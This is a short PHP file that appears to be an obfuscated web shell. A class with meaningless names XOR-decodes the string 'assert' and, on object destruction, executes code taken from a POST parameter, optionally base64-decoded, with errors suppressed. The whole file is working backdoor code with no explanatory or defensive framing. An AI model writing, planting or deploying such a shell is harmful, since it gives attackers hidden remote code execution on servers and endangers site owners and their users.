<?php 
class FVXK { 
    function PrVp() {
        $gfUJ = "\xa9" ^ "\xc8";
        $Rvvh = "\xfc" ^ "\x8f";
        $eHDv = "\x8e" ^ "\xfd";
        $ALMN = "\x60" ^ "\x5";
        $xDGA = "\xf6" ^ "\x84";
        $PQrm = "\x53" ^ "\x27";
        $kCXy =$gfUJ.$Rvvh.$eHDv.$ALMN.$xDGA.$PQrm;
        return $kCXy;
    }
    function __destruct(){
        $BSeC=$this->PrVp();
        @$BSeC($this->uW);
    }
}
$fvxk = new FVXK();
@$fvxk->uW = isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>